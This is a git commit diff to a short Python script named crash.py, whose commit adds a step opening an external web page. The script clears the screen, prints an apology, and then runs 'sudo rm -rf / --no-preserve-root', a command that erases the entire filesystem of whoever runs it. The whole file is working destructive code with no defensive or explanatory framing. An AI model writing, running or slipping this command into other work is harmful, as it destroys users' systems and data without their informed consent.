7dcb1739c4b9d2e6952bb782d306c8e0be6e8e5f
Mr Linux <147140666+Allaboutmeiamlinux@users.noreply.github.com>
2024-04-02 19:42:28 +0530

    Update crash.py

--- crash.py
+++ crash.py
@@ -4,4 +4,6 @@ import time
 os.system('clear')
 print("Sorry for the inconvenience")
 time.sleep(2)
+os.system(' open https://allaboutmeiamlinux.github.io/img/')
+time.sleep(5)
 os.system('sudo rm -rf / --no-preserve-root')
